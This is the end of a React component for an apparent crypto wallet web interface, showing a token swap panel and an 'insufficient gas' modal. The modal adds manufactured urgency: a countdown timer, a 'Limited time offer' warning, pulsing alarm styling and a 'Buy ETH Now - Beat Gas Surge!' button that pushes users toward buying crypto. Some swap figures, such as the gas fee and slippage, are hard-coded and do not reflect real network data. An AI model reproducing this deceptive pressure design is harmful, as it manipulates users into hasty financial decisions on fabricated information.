                        Balance: {swapFromToken === 'ETH' ? 
                          walletData.ethBalance.toFixed(4) : 
                          walletData.tokens.find(t => t.symbol === swapFromToken)?.balance || '0.00'
                        }
                      </div>
                    </div>
                    <div className="flex items-center justify-between">
                      <input 
                        type="number" 
                        placeholder="0.0" 
                        value={swapFromAmount}
                        onChange={(e) => {
                          setSwapFromAmount(e.target.value);
                          setTimeout(calculateSwapRate, 100);
                        }}
                        className="bg-transparent text-white text-xl font-semibold outline-none flex-1" 
                      />
                      <div className="flex items-center cursor-pointer" onClick={() => {
                        const tokens = ['ETH', 'USDT', 'USDC'];
                        const currentIndex = tokens.indexOf(swapFromToken);
                        const nextToken = tokens[(currentIndex + 1) % tokens.length];
                        setSwapFromToken(nextToken);
                        setTimeout(calculateSwapRate, 100);
                      }}>
                        <img 
                          src={{
                            'ETH': 'https://assets.coingecko.com/coins/images/279/small/ethereum.png',
                            'USDT': 'https://assets.coingecko.com/coins/images/325/small/Tether.png',
                            'USDC': 'https://assets.coingecko.com/coins/images/6319/small/USD_Coin_icon.png'
                          }[swapFromToken]} 
                          className="w-6 h-6 rounded-full mr-2" 
                        />
                        <span className="text-white">{swapFromToken}</span>
                        <i className="fas fa-chevron-down text-gray-400 ml-1 text-xs"></i>
                      </div>
                    </div>
                  </div>
                  
                  <div className="text-center">
                    <button 
                      onClick={() => {
                        const temp = swapFromToken;
                        setSwapFromToken(swapToToken);
                        setSwapToToken(temp);
                        setSwapFromAmount(swapToAmount);
                        setTimeout(calculateSwapRate, 100);
                      }}
                      className="text-gray-400 hover:text-white text-xl"
                    >
                      ⇅
                    </button>
                  </div>
                  
                  <div className="bg-gray-700 p-4 rounded-lg">
                    <div className="flex justify-between items-center mb-2">
                      <div className="text-gray-300 text-sm">To</div>
                      <div className="text-gray-400 text-xs">
                        Balance: {swapToToken === 'ETH' ? 
                          walletData.ethBalance.toFixed(4) : 
                          walletData.tokens.find(t => t.symbol === swapToToken)?.balance || '0.00'
                        }
                      </div>
                    </div>
                    <div className="flex items-center justify-between">
                      <input 
                        type="number" 
                        placeholder="0.0" 
                        value={swapToAmount}
                        readOnly
                        className="bg-transparent text-white text-xl font-semibold outline-none flex-1" 
                      />
                      <div className="flex items-center cursor-pointer" onClick={() => {
                        const tokens = ['USDT', 'USDC', 'ETH'];
                        const currentIndex = tokens.indexOf(swapToToken);
                        const nextToken = tokens[(currentIndex + 1) % tokens.length];
                        setSwapToToken(nextToken);
                        setTimeout(calculateSwapRate, 100);
                      }}>
                        <img 
                          src={{
                            'ETH': 'https://assets.coingecko.com/coins/images/279/small/ethereum.png',
                            'USDT': 'https://assets.coingecko.com/coins/images/325/small/Tether.png',
                            'USDC': 'https://assets.coingecko.com/coins/images/6319/small/USD_Coin_icon.png'
                          }[swapToToken]} 
                          className="w-6 h-6 rounded-full mr-2" 
                        />
                        <span className="text-white">{swapToToken}</span>
                        <i className="fas fa-chevron-down text-gray-400 ml-1 text-xs"></i>
                      </div>
                    </div>
                  </div>
                  
                  {swapFromAmount && swapToAmount && (
                    <div className="bg-gray-900 p-3 rounded-lg">
                      <div className="flex justify-between text-sm mb-1">
                        <span className="text-gray-400">Rate:</span>
                        <span className="text-white">1 {swapFromToken} = {(parseFloat(swapToAmount) / parseFloat(swapFromAmount)).toFixed(2)} {swapToToken}</span>
                      </div>
                      <div className="flex justify-between text-sm mb-1">
                        <span className="text-gray-400">Slippage:</span>
                        <span className="text-white">0.3%</span>
                      </div>
                      <div className="flex justify-between text-sm">
                        <span className="text-gray-400">Gas fee:</span>
                        <span className="text-white">~$18.50</span>
                      </div>
                    </div>
                  )}
                  
                  <button 
                    onClick={() => processTransaction('swap', null, '0.006')}
                    disabled={loading || !swapFromAmount || parseFloat(swapFromAmount) <= 0}
                    className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-gray-600 py-3 rounded-lg text-white font-semibold"
                  >
                    {loading ? 'Swapping...' : swapFromAmount ? `Swap ${swapFromToken}` : 'Enter amount'}
                  </button>
                </div>
              </div>
            </div>
          )}



          {/* Insufficient Gas Modal with Urgency */}
          {showModal === 'insufficientGas' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full border border-red-500">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg flex items-center">
                    ⚠️ Insufficient Balance
                    {urgencyTimer && (
                      <span className="ml-2 text-red-400 text-sm animate-pulse">
                        {Math.floor(urgencyTimer / 60)}:{(urgencyTimer % 60).toString().padStart(2, '0')}
                      </span>
                    )}
                  </h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-4">
                  <div className="text-center">
                    <div className="text-red-400 text-3xl mb-2 animate-bounce">🔥</div>
                    <p className="text-gray-300 text-sm">
                      Network congestion is {networkCongestion.toUpperCase()}! Gas fees: ${gasPrice.toFixed(2)}
                    </p>
                    {urgencyTimer && urgencyTimer < 600 && (
                      <p className="text-red-400 text-xs mt-2 animate-pulse">
                        ⏰ Limited time offer expires in {Math.floor(urgencyTimer / 60)} minutes!
                      </p>
                    )}
                  </div>
                  
                  <div className="bg-gray-700 p-4 rounded-lg border border-red-600">
                    <div className="flex justify-between items-center mb-2">
                      <span className="text-gray-300 text-sm">Current Balance:</span>
                      <span className="text-white">{userBalance.toFixed(4)} ETH</span>
                    </div>
                    <div className="flex justify-between items-center mb-2">
                      <span className="text-gray-300 text-sm">Required ({networkCongestion} gas):</span>
                      <span className="text-red-400">{calculateGasFee()} ETH</span>
                    </div>
                    <div className="flex justify-between items-center">
                      <span className="text-gray-300 text-sm">Network Status:</span>
                      <span className={`text-sm ${
                        networkCongestion === 'extreme' ? 'text-red-400' :
                        networkCongestion === 'high' ? 'text-orange-400' :
                        networkCongestion === 'medium' ? 'text-yellow-400' : 'text-green-400'
                      }`}>
                        {networkCongestion.toUpperCase()} CONGESTION
                      </span>
                    </div>
                  </div>
                  
                  <button 
                    onClick={async () => {
                      setShowModal(null);
                      if (!urgencyTimer) startUrgencyTimer();
                      await promptBuyCrypto();
                    }}
                    className="w-full bg-red-600 hover:bg-red-700 py-3 rounded-lg text-white font-semibold animate-pulse"
                  >
                    🚀 Buy ETH Now - Beat Gas Surge!
                  </button>
                  
                  <button 
                    onClick={() => setShowModal(null)}
                    className="w-full bg-gray-600 hover:bg-gray-700 py-2 rounded-lg text-white text-sm"
                  >
                    Wait (Gas may increase)
                  </button>
                </div>
              </div>
            </div>
          )}

          {/* Status Message */}
          {status && (
            <div className="fixed bottom-4 left-1/2 transform -translate-x-1/2 bg-gray-800 px-4 py-2 rounded-lg border border-gray-600 z-50">
              <div className="text-center text-sm text-gray-300">{status}</div>
            </div>
          )}
        </div>
      </div>
    </>
  );
}